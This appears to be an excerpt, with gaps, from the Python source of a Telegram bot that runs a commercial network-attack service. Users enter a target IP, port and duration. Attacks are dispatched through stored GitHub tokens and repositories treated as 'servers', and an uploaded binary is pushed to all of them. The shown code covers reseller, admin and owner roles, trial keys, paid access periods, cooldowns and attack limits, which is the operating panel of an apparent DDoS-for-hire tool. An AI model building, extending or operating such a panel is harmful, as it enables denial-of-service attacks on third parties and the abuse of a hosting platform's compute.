...
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if data == "attack_cancel":
        current_attack_data = current_attack
        if not current_attack_data:
            await query.answer(f"ℹ️ {to_small_caps('No attack running')}", show_alert=True)
            return
        progress = await query.edit_message_text(f"🔄 {to_small_caps('Cancelling attack')}...")
        total = 0
        for token_data in github_tokens:
            stopped = instant_stop_all_jobs(token_data['token'], token_data['repo'])
            total += stopped
        current_attack = None
        text = f"╔════════════════════════╗\n"
        text += f"║  {to_small_caps('ATTACK CANCELLED')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        text += f"🚫 {to_small_caps('Attack cancelled successfully')}\n"
        text += f"├ 🎯 {to_small_caps('Was targeting')}: {current_attack_data['ip']}:{current_attack_data['port']}\n"
        text += f"└ 📊 {to_small_caps('Jobs cancelled')}: {total}"
        keyboard = [
            [
                InlineKeyboardButton(f"⚡ {to_small_caps('New Attack')}", callback_data="attack"),
    ...
    if data == "settings":
        ...
        text += f"├ ✅ {to_small_caps('Auto Approve')}: {'🟢 ON' if AUTO_APPROVE else '🔴 OFF'} ({AUTO_APPROVE_DAYS}ᴅ)\n"
        text += f"├ ⏱️ {to_small_caps('Cooldown')}: {COOLDOWN_DURATION}s\n"
        text += f"└ 🎯 {to_small_caps('Max Attacks')}: {MAX_ATTACKS}"
        
        keyboard = [
            [InlineKeyboardButton(f"🔧 {to_small_caps('Toggle Maintenance')}", callback_data="toggle_maintenance")],
            [InlineKeyboardButton(f"✅ {to_small_caps('Toggle Auto Approve')}", callback_data="toggle_auto_approve")],
    ...
    # Change Cooldown
    if data == "change_cooldown":
        if not is_owner(user_id):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        context.user_data['waiting_for'] = 'change_cooldown'
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('CHANGE COOLDOWN')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"⏱️ {to_small_caps('Current cooldown')}: {COOLDOWN_DURATION}s\n\n"
        text += f"📝 {to_small_caps('Enter new cooldown in seconds')}\n"
        text += f"📌 {to_small_caps('Recommended')}: 30-60s"
        keyboard = [[InlineKeyboardButton(f"❌ {to_small_caps('Cancel')}", callback_data="settings")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # Change Max Attacks
    if data == "change_max_attacks":
        if not is_owner(user_id):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        context.user_data['waiting_for'] = 'change_max_attacks'
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('CHANGE MAX ATTACKS')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"🎯 {to_small_caps('Current max')}: {MAX_ATTACKS}\n\n"
        text += f"📝 {to_small_caps('Enter new max attacks')}\n"
        text += f"📌 {to_small_caps('Recommended')}: 100-1000"
        keyboard = [[InlineKeyboardButton(f"❌ {to_small_caps('Cancel')}", callback_data="settings")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # Change Auto Approve Days
    if data == "change_auto_days":
        if not is_owner(user_id):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        context.user_data['waiting_for'] = 'change_auto_days'
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('CHANGE AUTO DAYS')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"⏱️ {to_small_caps('Current days')}: {AUTO_APPROVE_DAYS}\n\n"
        text += f"📝 {to_small_caps('Enter new days for auto approve')}\n"
        text += f"📌 {to_small_caps('Recommended')}: 3-30"
        keyboard = [[InlineKeyboardButton(f"❌ {to_small_caps('Cancel')}", callback_data="settings")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    ...
    if data == "toggle_auto_approve":
        ...
        save_json('auto_approve.json', {"enabled": AUTO_APPROVE, "days": AUTO_APPROVE_DAYS})
        
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('AUTO APPROVE MODE')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"✅ {to_small_caps('Status')}: {'🟢 ENABLED' if AUTO_APPROVE else '🔴 DISABLED'}\n"
        text += f"⏱️ {to_small_caps('Default Days')}: {AUTO_APPROVE_DAYS}"
        
        keyboard = [
            [InlineKeyboardButton(f"⚙️ {to_small_caps('Change Days')}", callback_data="change_auto_days")],
            [InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    ...
    if data == "trial_keys":
        ...
        # Fix: Handle both string and float expiry values
        active_keys = 0
        used_keys = 0
        for k in trial_keys.values():
            if k.get('used', False):
                used_keys += 1
            else:
                try:
                    expiry = k.get('expiry', 0)
    ...
    if data == "gen_trial":
        ...
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('GENERATE TRIAL KEY')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"📝 {to_small_caps('Enter hours for trial')}\n\n"
        text += f"📌 {to_small_caps('Example')}: 24 ({to_small_caps('for')} 1 {to_small_caps('day')})"
        keyboard = [[InlineKeyboardButton(f"❌ {to_small_caps('Cancel')}", callback_data="trial_keys")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # View Trial Keys
    if data == "view_trial_keys":
        if not is_owner(user_id):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('TRIAL KEYS LIST')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        
        if trial_keys:
            for key, data in list(trial_keys.items())[:10]:
                status = "✅ ᴀᴄᴛɪᴠᴇ" if not data.get('used', False) else "❌ ᴜsᴇᴅ"
                text += f"🔑 `{key}`\n└ {status}\n\n"
        else:
            text += f"ℹ️ {to_small_caps('No keys generated yet')}"
    ...
    # Manage Owners
    if data == "manage_owners":
        if not is_primary_owner(user_id):
            await query.answer(to_small_caps("Only primary owner can manage owners"), show_alert=True)
            return
        
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('MANAGE OWNERS')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"👑 {to_small_caps('Total Owners')}: {len(owners)}\n\n"
        
        if owners:
            for oid, odata in list(owners.items())[:5]:
                primary = "⭐" if odata.get('is_primary', False) else ""
                text += f"{primary} {odata.get('username', 'Unknown')}\n"
        
        keyboard = [
            [InlineKeyboardButton(f"➕ {to_small_caps('Add Owner')}", callback_data="add_owner")],
            [InlineKeyboardButton(f"❌ {to_small_caps('Remove Owner')}", callback_data="remove_owner")],
            [InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    ...
    if data == "manage_admins":
        ...
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('MANAGE ADMINS')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"⚡ {to_small_caps('Total Admins')}: {len(admins)}\n\n"
        
        if admins:
            for aid, adata in list(admins.items())[:5]:
                text += f"⚡ {adata.get('username', 'Unknown')}\n"
        
        keyboard = [
            [InlineKeyboardButton(f"➕ {to_small_caps('Add Admin')}", callback_data="add_admin")],
            [InlineKeyboardButton(f"❌ {to_small_caps('Remove Admin')}", callback_data="remove_admin")],
            [InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    ...
    # Manage Resellers
    if data == "manage_resellers":
        if not is_owner(user_id):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('MANAGE RESELLERS')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"💎 {to_small_caps('Total Resellers')}: {len(resellers)}\n\n"
        
        if resellers:
            for rid, rdata in list(resellers.items())[:5]:
                text += f"💎 {rdata.get('username', 'Unknown')}\n"
        
        keyboard = [
            [InlineKeyboardButton(f"➕ {to_small_caps('Add Reseller')}", callback_data="add_reseller")],
            [InlineKeyboardButton(f"❌ {to_small_caps('Remove Reseller')}", callback_data="remove_reseller")],
            [InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    ...
    if data == "add_admin":
        ...
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('ADD ADMIN')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"📝 {to_small_caps('Enter user ID to add as admin')}"
        keyboard = [[InlineKeyboardButton(f"❌ {to_small_caps('Cancel')}", callback_data="manage_admins")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    ...
    if data == "remove_admin":
        ...
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('REMOVE ADMIN')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        ...
        if admins:
            for aid, adata in admins.items():
                ...
                keyboard.append([InlineKeyboardButton(f"❌ {username}", callback_data=f"rmadm_{aid}")])
        else:
            text += f"ℹ️ {to_small_caps('No admins to remove')}"
        
        keyboard.append([InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")])
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    ...
    if data.startswith("rmadm_"):
        ...
        aid = data.replace("rmadm_", "")
        if aid in admins:
            del admins[aid]
            save_json('admins.json', admins)
            await query.answer(f"✅ {to_small_caps('Admin removed')}", show_alert=True)
    ...
    if data == "add_reseller":
        ...
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('ADD RESELLER')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"📝 {to_small_caps('Enter user ID to add as reseller')}"
        keyboard = [[InlineKeyboardButton(f"❌ {to_small_caps('Cancel')}", callback_data="manage_resellers")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # Remove Reseller - show list
    if data == "remove_reseller":
        ...
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('REMOVE RESELLER')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        
        keyboard = []
        if resellers:
            for rid, rdata in resellers.items():
                username = rdata.get('username', 'Unknown')
                keyboard.append([InlineKeyboardButton(f"❌ {username}", callback_data=f"rmres_{rid}")])
        else:
            text += f"ℹ️ {to_small_caps('No resellers to remove')}"
    ...
    if data.startswith("rmres_"):
        if not is_owner(user_id):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        
        rid = data.replace("rmres_", "")
        if rid in resellers:
            del resellers[rid]
            save_json('resellers.json', resellers)
            await query.answer(f"✅ {to_small_caps('Reseller removed')}", show_alert=True)
        
        # Refresh list
        query.data = "remove_reseller"
        await button_handler(update, context)
        return
    
    # Remove Server - show list
    if data == "remove_server":
        if not is_owner(user_id):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('REMOVE SERVER')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        
        keyboard = []
        if github_tokens:
            for idx, token_data in enumerate(github_tokens):
                repo = token_data['repo']
                keyboard.append([InlineKeyboardButton(f"❌ {repo}", callback_data=f"rmsrv_{idx}")])
        else:
            text += f"ℹ️ {to_small_caps('No servers to remove')}"
    ...
    if data.startswith("rmsrv_"):
        if not is_owner(user_id):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        
        idx = int(data.replace("rmsrv_", ""))
        if idx < len(github_tokens):
            removed = github_tokens.pop(idx)
            save_json('github_tokens.json', github_tokens)
            await query.answer(f"✅ {to_small_caps('Server removed')}: {removed['repo']}", show_alert=True)
        
        # Refresh list
        query.data = "remove_server"
        await button_handler(update, context)
        return
    ...
    if data == "add_server":
        if not is_owner(user_id):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        context.user_data['waiting_for'] = 'server_token'
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('ADD SERVER')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"📝 {to_small_caps('Send github token and repo')}\n\n"
        text += f"┌─────────────────────┐\n"
        text += f"│ {to_small_caps('Format')}: TOKEN REPO │\n"
        text += f"└─────────────────────┘\n\n"
        text += f"📌 {to_small_caps('Example')}:\nghp_xxxxx user/repo"
        keyboard = [[InlineKeyboardButton(f"❌ {to_small_caps('Cancel')}", callback_data="servers")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # Upload Binary
    if data == "upload_binary":
        if not is_owner(user_id):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        context.user_data['waiting_for'] = 'binary'
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('UPLOAD BINARY')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"📤 {to_small_caps('Send binary file to upload')}\n\n"
        text += f"ℹ️ {to_small_caps('File will be uploaded to all servers')}"
        keyboard = [[InlineKeyboardButton(f"❌ {to_small_caps('Cancel')}", callback_data="servers")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    ...
    if data == "approve_pending":
        ...
        keyboard = []
        if pending_users:
            text += f"📊 {to_small_caps('Total Pending')}: {len(pending_users)}\n\n"
            for u in pending_users[:10]:
                username = u.get('username', 'Unknown')
                uid = u['user_id']
                text += f"👤 {username}\n📅 {u.get('request_date', 'Unknown')}\n\n"
                keyboard.append([InlineKeyboardButton(f"✅ {to_small_caps('Approve')} {username}", callback_data=f"approve_{uid}")])
        else:
            text += f"ℹ️ {to_small_caps('No pending users')}"
        
        keyboard.append([InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")])
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # Handle approve user with days selection
    if data.startswith("approve_"):
        ...
        for u in pending_users:
            if str(u['user_id']) == target_id:
                pending_user = u
                break
        
        if not pending_user:
            await query.answer(f"❌ {to_small_caps('User not found')}", show_alert=True)
            return
        
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('SELECT DAYS')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"👤 {to_small_caps('User')}: {pending_user.get('username', 'Unknown')}\n"
        text += f"🆔 {to_small_caps('ID')}: {target_id}\n\n"
        text += f"📅 {to_small_caps('Select access duration')}:"
        
        keyboard = [
            [
                InlineKeyboardButton(f"1 {to_small_caps('day')}", callback_data=f"appr_{target_id}_1"),
                InlineKeyboardButton(f"3 {to_small_caps('days')}", callback_data=f"appr_{target_id}_3")
            ],
            [
                InlineKeyboardButton(f"7 {to_small_caps('days')}", callback_data=f"appr_{target_id}_7"),
                InlineKeyboardButton(f"15 {to_small_caps('days')}", callback_data=f"appr_{target_id}_15")
            ],
            [
                InlineKeyboardButton(f"30 {to_small_caps('days')}", callback_data=f"appr_{target_id}_30"),
                InlineKeyboardButton(f"♾️ {to_small_caps('Lifetime')}", callback_data=f"appr_{target_id}_0")
            ],
            [InlineKeyboardButton(f"❌ {to_small_caps('Cancel')}", callback_data="approve_pending")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # Handle final approval with days
    if data.startswith("appr_"):
        ...
        # Remove from pending
        pending_users[:] = [u for u in pending_users if str(u['user_id']) != target_id]
        save_json('pending_users.json', pending_users)
        ...
        if days == 0:
            ...
            days_text = f"{days} {to_small_caps('days')}"
        ...
        try:
            ...
            msg += f"╚════════════════════════╝\n\n"
            msg += f"🎉 {to_small_caps('You have been approved')}\n"
            msg += f"⏱️ {to_small_caps('Duration')}: {days_text}\n\n"
        ...
        # Show success
        text = f"╔════════════════════════╗\n"
        text += f"║  {to_small_caps('USER APPROVED')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        text += f"✅ {to_small_caps('Successfully approved')}\n"
        text += f"├ 🆔 {to_small_caps('ID')}: {target_id}\n"
        text += f"└ ⏱️ {to_small_caps('Duration')}: {days_text}"
        
        keyboard = [
            [InlineKeyboardButton(f"✅ {to_small_caps('Approve More')}", callback_data="approve_pending")],
            [InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # Remove User - show list
    if data == "remove_user":
        if not (is_owner(user_id) or is_admin(user_id)):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        ...
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('REMOVE USER')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        
        keyboard = []
        if approved_users:
            text += f"📊 {to_small_caps('Total Users')}: {len(approved_users)}\n\n"
            for uid, udata in list(approved_users.items())[:10]:
                username = udata.get('username', 'Unknown')
                text += f"👤 {username}\n"
                keyboard.append([InlineKeyboardButton(f"❌ {to_small_caps('Remove')} {username}", callback_data=f"rmv_{uid}")])
        else:
            text += f"ℹ️ {to_small_caps('No users to remove')}"
    ...
    if data.startswith("rmv_"):
        if not (is_owner(user_id) or is_admin(user_id)):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        
        target_id = data.replace("rmv_", "")
        
        if target_id not in approved_users:
            await query.answer(f"❌ {to_small_caps('User not found')}", show_alert=True)
            return
        
        username = approved_users[target_id].get('username', 'Unknown')
        
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('CONFIRM REMOVAL')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"⚠️ {to_small_caps('Are you sure')}?\n\n"
        text += f"👤 {to_small_caps('User')}: {username}\n"
        text += f"🆔 {to_small_caps('ID')}: {target_id}"
        
        keyboard = [
            [
                InlineKeyboardButton(f"✅ {to_small_caps('Yes, Remove')}", callback_data=f"rmvconf_{target_id}"),
                InlineKeyboardButton(f"❌ {to_small_caps('Cancel')}", callback_data="remove_user")
            ]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    ...
    if data.startswith("rmvconf_"):
        if not (is_owner(user_id) or is_admin(user_id)):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        
        target_id = data.replace("rmvconf_", "")
        ...
        if target_id in approved_users:
            ...
            keyboard = [
                [InlineKeyboardButton(f"❌ {to_small_caps('Remove More')}", callback_data="remove_user")],
                [InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]
            ]
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        else:
        ...
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('ALL USERS')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"📊 {to_small_caps('Total')}: {len(approved_users)}\n\n"
        
        if approved_users:
            for uid, udata in list(approved_users.items())[:5]:
                expiry = udata.get('expiry', 0)
                if expiry == "LIFETIME":
                    exp_text = "ʟɪғᴇᴛɪᴍᴇ"
                else:
                    days = int((expiry - time.time()) / 86400) if expiry > time.time() else 0
                    exp_text = f"{days}ᴅ"
                text += f"👤 {udata.get('username', 'Unknown')}\n"
                text += f"└ 📅 {exp_text}\n\n"
...
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if waiting_for == 'change_cooldown':
        if not is_owner(user_id):
            return
        try:
            new_cooldown = int(text)
            if new_cooldown < 10 or new_cooldown > 300:
                await update.message.reply_text(f"❌ {to_small_caps('Please enter seconds between 10-300')}")
                return
            
            COOLDOWN_DURATION = new_cooldown
            save_json('cooldown.json', {"cooldown": new_cooldown})
            context.user_data.clear()
            
            msg = f"╔════════════════════════╗\n"
            msg += f"║  {to_small_caps('COOLDOWN UPDATED')}  ║\n"
            msg += f"╚════════════════════════╝\n\n"
            msg += f"✅ {to_small_caps('New cooldown')}: {new_cooldown}s"
            
            await update.message.reply_text(msg)
        except:
            await update.message.reply_text(f"❌ {to_small_caps('Invalid number')}")
        return
    
    # Handle max attacks change
    if waiting_for == 'change_max_attacks':
        if not is_owner(user_id):
            return
        try:
            new_max = int(text)
            if new_max < 10 or new_max > 10000:
                await update.message.reply_text(f"❌ {to_small_caps('Please enter number between 10-10000')}")
                return
            
            MAX_ATTACKS = new_max
            save_json('max_attacks.json', {"max_attacks": new_max})
            context.user_data.clear()
            
            msg = f"╔════════════════════════╗\n"
            msg += f"║  {to_small_caps('MAX ATTACKS UPDATED')}  ║\n"
            msg += f"╚════════════════════════╝\n\n"
            msg += f"✅ {to_small_caps('New max attacks')}: {new_max}"
    ...
    # Handle auto approve days change
    if waiting_for == 'change_auto_days':
        if not is_owner(user_id):
            return
        try:
            new_days = int(text)
            if new_days < 1 or new_days > 365:
                await update.message.reply_text(f"❌ {to_small_caps('Please enter days between 1-365')}")
                return
            
            AUTO_APPROVE_DAYS = new_days
            save_json('auto_approve.json', {"enabled": AUTO_APPROVE, "days": new_days})
            context.user_data.clear()
            
            msg = f"╔════════════════════════╗\n"
            msg += f"║  {to_small_caps('AUTO DAYS UPDATED')}  ║\n"
            msg += f"╚════════════════════════╝\n\n"
            msg += f"✅ {to_small_caps('New auto approve days')}: {new_days}"
    ...
    # Handle trial hours
    if waiting_for == 'trial_hours':
        if not is_owner(user_id):
            return
        try:
            hours = int(text)
            if hours <= 0 or hours > 720:
                await update.message.reply_text(f"❌ {to_small_caps('Please enter hours between 1-720')}")
                return
            ...
            msg = f"╔════════════════════════╗\n"
            msg += f"║  {to_small_caps('TRIAL KEY GENERATED')}  ║\n"
            msg += f"╚════════════════════════╝\n\n"
            msg += f"🔑 {to_small_caps('Key')}: `{key}`\n"
            msg += f"⏱️ {to_small_caps('Duration')}: {hours}ʜ\n\n"
            msg += f"💡 {to_small_caps('Share this key with users')}"
    ...
    if waiting_for == 'add_admin':
        ...
        try:
            ...
            if target_id in admins:
                await update.message.reply_text(f"❌ {to_small_caps('Already an admin')}")
                return
            ...
            msg = f"╔════════════════════╗\n"
            msg += f"║  {to_small_caps('ADMIN ADDED')}  ║\n"
            msg += f"╚════════════════════╝\n\n"
            msg += f"✅ {to_small_caps('Successfully added')}\n"
            msg += f"└ 🆔 {to_small_caps('ID')}: {target_id}"
            ...
            try:
                await context.bot.send_message(
                    ...
                    text=f"╔════════════════════════╗\n║  {to_small_caps('ADMIN ACCESS GRANTED')}  ║\n╚════════════════════════╝\n\n⚡ {to_small_caps('You have been promoted to admin')}\n💡 {to_small_caps('Use')} /start"
                )
            except:
                pass
        except:
            await update.message.reply_text(f"❌ {to_small_caps('Invalid ID')}")
        return
    
    # Handle add reseller
    if waiting_for == 'add_reseller':
        if not is_owner(user_id):
            return
        try:
            target_id = str(text.strip())
            ...
            if target_id in resellers:
                await update.message.reply_text(f"❌ {to_small_caps('Already a reseller')}")
                return
            ...
            msg = f"╔════════════════════╗\n"
            msg += f"║  {to_small_caps('RESELLER ADDED')}  ║\n"
            msg += f"╚════════════════════╝\n\n"
            msg += f"✅ {to_small_caps('Successfully added')}\n"
            msg += f"└ 🆔 {to_small_caps('ID')}: {target_id}"
            ...
            try:
                await context.bot.send_message(
                    chat_id=int(target_id), 
                    text=f"╔════════════════════════╗\n║  {to_small_caps('RESELLER ACCESS GRANTED')}  ║\n╚════════════════════════╝\n\n💎 {to_small_caps('You are now a reseller')}\n💡 {to_small_caps('Use')} /start"
                )
            except:
                pass
        except:
    ...
    # Handle server token
    if waiting_for == 'server_token':
        if not is_owner(user_id):
            return
        try:
            parts = text.split()
            if len(parts) != 2:
                await update.message.reply_text(f"❌ {to_small_caps('Format')}: TOKEN REPO")
                return
            ...
            try:
                g = Github(token)
                test_repo = g.get_repo(repo)
                test_repo.name  # Test access
            except:
                await update.message.reply_text(f"❌ {to_small_caps('Invalid token or repo')}")
                return
            
            github_tokens.append({"token": token, "repo": repo})
            save_json('github_tokens.json', github_tokens)
            
            msg = f"╔════════════════════╗\n"
            msg += f"║  {to_small_caps('SERVER ADDED')}  ║\n"
            msg += f"╚════════════════════╝\n\n"
            msg += f"✅ {to_small_caps('Successfully added')}\n"
            msg += f"├ 📦 {to_small_caps('Repo')}: {repo}\n"
            msg += f"└ 🔑 {to_small_caps('Total Servers')}: {len(github_tokens)}"
            
            await update.message.reply_text(msg)
        except:
            await update.message.reply_text(f"❌ {to_small_caps('Error adding server')}")
        return
    ...
    if waiting_for == 'attack_params':
        ...
        with attack_lock:
            current_attack = {"ip": ip, "port": port, "time": duration, "user": user_id, "started_at": time.time()}
        ...
        keyboard = [
            [
                InlineKeyboardButton(f"⏸️ {to_small_caps('Stop')}", callback_data="stop"),
                InlineKeyboardButton(f"🚫 {to_small_caps('Cancel')}", callback_data="attack_cancel")
            ]
        ]
        timer_bar_total = 20
        filled = timer_bar_total
        bar = "█" * filled + "░" * (timer_bar_total - filled)
        ...
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('LIVE TIMER')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"[{bar}]\n"
        text += f"⏳ {to_small_caps('Remaining')}: {mins:02d}m {secs:02d}s\n\n"
        text += f"✅ {to_small_caps('Attack in progress')}"
        msg = await progress.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        started_at = current_attack['started_at']
        async def countdown_updater(message, attack_ip, attack_port, total_duration, started_at, srv_success):
            global current_attack
            while True:
                await asyncio.sleep(1)
                if not current_attack or current_attack.get('ip') != attack_ip or current_attack.get('port') != attack_port:
                    break
                elapsed = time.time() - started_at
                remaining_time = max(0, total_duration - int(elapsed))
                if remaining_time <= 0:
                    current_attack = None
                    bar = "░" * timer_bar_total
                    text = f"╔════════════════════════╗\n"
                    text += f"║  🔴 {to_small_caps('ATTACK FINISHED')}  ║\n"
                    text += f"╚════════════════════════╝\n\n"
                    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
                    text += f"┃  {to_small_caps('TARGET INFO')}  ┃\n"
                    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
                    text += f"├ 🎯 {to_small_caps('Target')}: {attack_ip}:{attack_port}\n"
                    text += f"├ 🔑 {to_small_caps('Servers')}: {srv_success}/{len(github_tokens)}\n"
                    text += f"└ ⏱️ {to_small_caps('Duration')}: {total_duration}s\n\n"
                    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
                    text += f"┃  {to_small_caps('LIVE TIMER')}  ┃\n"
                    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
                    text += f"[{bar}]\n"
                    text += f"⏳ {to_small_caps('Remaining')}: 00m 00s\n\n"
                    text += f"🏁 {to_small_caps('Attack completed')}"
                    keyboard = [
                        [
                            InlineKeyboardButton(f"⚡ {to_small_caps('New Attack')}", callback_data="attack"),
                            InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")
                ...
                progress_pct = remaining_time / total_duration
                filled = int(timer_bar_total * progress_pct)
                bar = "█" * filled + "░" * (timer_bar_total - filled)
                text = f"╔════════════════════════╗\n"
                text += f"║  🟢 {to_small_caps('ATTACK LAUNCHED')}  ║\n"
                text += f"╚════════════════════════╝\n\n"
                ...
                try:
                    ...
                    break
        asyncio.ensure_future(countdown_updater(msg, ip, port, duration, started_at, success))
        return
